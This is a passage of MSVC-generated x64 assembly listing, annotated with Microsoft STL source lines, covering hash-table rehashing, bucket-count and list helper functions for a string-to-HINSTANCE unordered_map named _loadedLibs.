	jne	SHORT $LN56@Forced_reh

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	mov	r8, r15
	call	memcmp

; 546  :     return _Left_size == _Right_size && _Traits::compare(_Left, _Right, _Left_size) == 0;

	test	eax, eax
	je	SHORT $LN239@Forced_reh
$LN56@Forced_reh:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 72   :         return _Ptr == _Right._Ptr;

	cmp	r13, rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1769 :                 if (_Bucket_lo == _Insert_before) {

	jne	SHORT $LL5@Forced_reh
$LN238@Forced_reh:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 474  :         const auto _First_prev  = _First->_Prev;

	mov	rdx, QWORD PTR [rdi+8]

; 475  :         _First_prev->_Next      = _Last;

	mov	QWORD PTR [rdx], rsi

; 476  :         const auto _Last_prev   = _Last->_Prev;

	mov	rcx, QWORD PTR [rsi+8]

; 477  :         _Last_prev->_Next       = _Before;

	mov	QWORD PTR [rcx], rbx

; 478  :         const auto _Before_prev = _Before->_Prev;

	mov	rax, QWORD PTR [rbx+8]

; 479  :         _Before_prev->_Next     = _First;

	mov	QWORD PTR [rax], rdi

; 480  : 
; 481  :         // fixup the _Prev values
; 482  :         _Before->_Prev = _Last_prev;

	mov	QWORD PTR [rbx+8], rcx

; 483  :         _Last->_Prev   = _First_prev;

	mov	QWORD PTR [rsi+8], rdx

; 484  :         _First->_Prev  = _Before_prev;

	mov	QWORD PTR [rdi+8], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1775 :                     _Bucket_lo = _Inserted;

	mov	rax, QWORD PTR _Bucket_lo$1$[rsp]
	mov	QWORD PTR [rax], rdi
$LN287@Forced_reh:

; 1734 :         for (_Unchecked_iterator _Next_inserted = _Inserted; _Inserted != _End; _Inserted = _Next_inserted) {

	mov	rbx, 1099511628211			; 00000100000001b3H
$LN2@Forced_reh:
	mov	rdi, rsi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 72   :         return _Ptr == _Right._Ptr;

	cmp	rsi, rbp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1734 :         for (_Unchecked_iterator _Next_inserted = _Inserted; _Inserted != _End; _Inserted = _Next_inserted) {

	je	SHORT $LN285@Forced_reh
	mov	r15, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+48
	jmp	$LN288@Forced_reh
$LN239@Forced_reh:

; 1776 :                     break;
; 1777 :                 }
; 1778 : 
; 1779 :                 if (!_Traitsobj(_Inserted_key, _Traits::_Kfn(*--_Insert_before))) {
; 1780 :                     // Found insertion point, move the element here, bucket bounds are already okay.
; 1781 :                     ++_Insert_before;
; 1782 :                     // Element can't be already in position here because all elements we're inserting are after all
; 1783 :                     // the elements already in buckets, and *_Insert_before isn't the highest element in the bucket.
; 1784 :                     _Mylist::_Scary_val::_Unchecked_splice(_Insert_before._Ptr, _Inserted._Ptr, _Next_inserted._Ptr);

	mov	r8, QWORD PTR [rbx]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 474  :         const auto _First_prev  = _First->_Prev;

	mov	rdx, QWORD PTR [rdi+8]

; 475  :         _First_prev->_Next      = _Last;

	mov	QWORD PTR [rdx], rsi

; 476  :         const auto _Last_prev   = _Last->_Prev;

	mov	rcx, QWORD PTR [rsi+8]

; 477  :         _Last_prev->_Next       = _Before;

	mov	QWORD PTR [rcx], r8

; 478  :         const auto _Before_prev = _Before->_Prev;

	mov	rax, QWORD PTR [r8+8]

; 479  :         _Before_prev->_Next     = _First;

	mov	QWORD PTR [rax], rdi

; 480  : 
; 481  :         // fixup the _Prev values
; 482  :         _Before->_Prev = _Last_prev;

	mov	QWORD PTR [r8+8], rcx

; 483  :         _Last->_Prev   = _First_prev;

	mov	QWORD PTR [rsi+8], rdx

; 484  :         _First->_Prev  = _Before_prev;

	mov	QWORD PTR [rdi+8], rax
	jmp	SHORT $LN287@Forced_reh
$LN285@Forced_reh:
	mov	r14, QWORD PTR [rsp+56]
	mov	r13, QWORD PTR [rsp+64]
	mov	r12, QWORD PTR [rsp+72]
$LN282@Forced_reh:
	mov	rdi, QWORD PTR [rsp+120]
	mov	rsi, QWORD PTR [rsp+112]
	mov	rbp, QWORD PTR [rsp+96]
	mov	r15, QWORD PTR [rsp+48]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1795 :     }

	add	rsp, 80					; 00000050H
	pop	rbx
	ret	0
$LN290@Forced_reh:

; 1715 :             _Xlength_error("invalid hash bucket count");

	lea	rcx, OFFSET FLAT:??_C@_0BK@OGNNAFAB@invalid?5hash?5bucket?5count@
	call	?_Xlength_error@std@@YAXPEBD@Z		; std::_Xlength_error
	int	3
$LN286@Forced_reh:
?_Forced_rehash@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAX_K@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Forced_rehash
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?_Desired_grow_bucket_count@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA_K_K@Z
_TEXT	SEGMENT
this$dead$ = 48
_For_size$ = 56
?_Desired_grow_bucket_count@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA_K_K@Z PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Desired_grow_bucket_count, COMDAT

; 1684 :     _NODISCARD size_type _Desired_grow_bucket_count(const size_type _For_size) const noexcept {

$LN20:
	sub	rsp, 40					; 00000028H

; 1681 :         return static_cast<size_type>(_CSTD ceilf(static_cast<float>(_For_size) / max_load_factor()));

	xorps	xmm0, xmm0
	test	rdx, rdx
	js	SHORT $LN16@Desired_gr
	cvtsi2ss xmm0, rdx
	jmp	SHORT $LN17@Desired_gr
$LN16@Desired_gr:
	mov	rax, rdx
	and	edx, 1
	shr	rax, 1
	or	rax, rdx
	cvtsi2ss xmm0, rax
	addss	xmm0, xmm0
$LN17@Desired_gr:
	divss	xmm0, DWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A
	call	ceilf
	movss	xmm1, DWORD PTR __real@5f000000
	xor	ecx, ecx
	comiss	xmm0, xmm1
	jb	SHORT $LN15@Desired_gr
	subss	xmm0, xmm1
	comiss	xmm0, xmm1
	jae	SHORT $LN15@Desired_gr
	mov	rax, -9223372036854775808		; 8000000000000000H
	mov	rcx, rax
$LN15@Desired_gr:
	cvttss2si rax, xmm0
	add	rax, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 74   :     return _Left < _Right ? _Right : _Left;

	mov	ecx, 8
	cmp	rax, rcx
	cmova	rcx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash

; 1687 :         if (_Old_buckets >= _Req_buckets) {

	mov	rax, QWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A+56
	cmp	rax, rcx
	jae	SHORT $LN1@Desired_gr

; 1688 :             // we already have enough buckets so there's no need to change the count
; 1689 :             return _Old_buckets;
; 1690 :         }
; 1691 : 
; 1692 :         if (_Old_buckets < 512 && _Old_buckets * 8 >= _Req_buckets) {

	cmp	rax, 512				; 00000200H
	jae	SHORT $LN3@Desired_gr
	lea	rax, QWORD PTR [rax*8]
	cmp	rax, rcx
	cmovae	rcx, rax
$LN3@Desired_gr:

; 1693 :             // if we are changing the bucket count and have less than 512 buckets, use 8x more buckets
; 1694 :             return _Old_buckets * 8;
; 1695 :         }
; 1696 : 
; 1697 :         // power of 2 invariant means this will result in at least 2*_Old_buckets after round up in _Forced_rehash
; 1698 :         return _Req_buckets;
; 1699 :     }

	mov	rax, rcx
$LN1@Desired_gr:
	add	rsp, 40					; 00000028H
	ret	0
?_Desired_grow_bucket_count@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEBA_K_K@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Desired_grow_bucket_count
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?max_load_factor@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBAMXZ
_TEXT	SEGMENT
this$dead$ = 8
?max_load_factor@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBAMXZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::max_load_factor, COMDAT

; 908  :         return _Max_bucket_size();

	movss	xmm0, DWORD PTR ?_loadedLibs@@3V?$unordered_map@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@A

; 909  :     }

	ret	0
?max_load_factor@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBAMXZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::max_load_factor
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ?bucket_count@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$ = 8
?bucket_count@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KXZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::bucket_count, COMDAT

; 843  :         return _Maxidx;

	mov	rax, QWORD PTR [rcx+56]

; 844  :     }

	ret	0
?bucket_count@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEBA_KXZ ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::bucket_count
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ?max_size@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEBA_KXZ
_TEXT	SEGMENT
this$dead$ = 8
?max_size@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEBA_KXZ PROC ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::max_size, COMDAT

; 1195 :         return (_STD min)(

	mov	rax, 329406144173384850			; 0492492492492492H

; 1196 :             static_cast<size_type>((numeric_limits<difference_type>::max)()), _Alnode_traits::max_size(_Getal()));
; 1197 :     }

	ret	0
?max_size@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEBA_KXZ ENDP ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::max_size
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT ?__autoclassinit2@?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAAX_K@Z
_TEXT	SEGMENT
this$ = 8
classSize$dead$ = 16
?__autoclassinit2@?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAAX_K@Z PROC ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::__autoclassinit2, COMDAT
	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	ret	0
?__autoclassinit2@?$_List_unchecked_const_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@U_Iterator_base0@2@@std@@QEAAX_K@Z ENDP ; std::_List_unchecked_const_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >,std::_Iterator_base0>::__autoclassinit2
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xhash
;	COMDAT ??1_Clear_guard@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
$T1 = 48
this$ = 48
??1_Clear_guard@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA@XZ PROC ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Clear_guard::~_Clear_guard, COMDAT

; 479  :         ~_Clear_guard() {

$LN30:
	push	rbx
	sub	rsp, 32					; 00000020H

; 480  :             if (_Target) {

	mov	rbx, QWORD PTR [rcx]
	test	rbx, rbx
	je	SHORT $LN5@Clear_guar

; 1155 :         const auto _Oldsize = _List._Mypair._Myval2._Mysize;

	mov	rcx, QWORD PTR [rbx+16]

; 1156 :         if (_Oldsize == 0) {

	test	rcx, rcx
	je	SHORT $LN5@Clear_guar

; 1157 :             return;
; 1158 :         }
; 1159 : 
; 1160 :         if constexpr (_Nothrow_hash<_Traits, key_type>) {
; 1161 :             // In testing, hash<size_t>{}(size_t{}) takes about 14 times as much time as assigning a pointer, or
; 1162 :             // ~7-8 times as much as clearing a bucket. Therefore, if we would need to assign over more than 8 times
; 1163 :             // as many buckets as elements, remove element-by-element.
; 1164 :             if (bucket_count() / 8 > _Oldsize) {

	mov	rax, QWORD PTR [rbx+56]
	mov	rdx, QWORD PTR [rbx+8]
	shr	rax, 3
	cmp	rax, rcx
	jbe	SHORT $LN7@Clear_guar

; 1165 :                 const auto _Head = _List._Mypair._Myval2._Myhead;
; 1166 :                 _Unchecked_erase(_Head->_Next, _Head);

	mov	r8, rdx
	mov	rcx, rbx
	mov	rdx, QWORD PTR [rdx]

; 481  :                 _Target->clear();
; 482  :             }
; 483  :         }

	add	rsp, 32					; 00000020H
	pop	rbx

; 1166 :                 _Unchecked_erase(_Head->_Next, _Head);

	jmp	?_Unchecked_erase@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@PEAU32@QEAU32@@Z ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Unchecked_erase
$LN7@Clear_guar:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 1492 :         _Node::_Free_non_head(_Getal(), _My_data._Myhead);

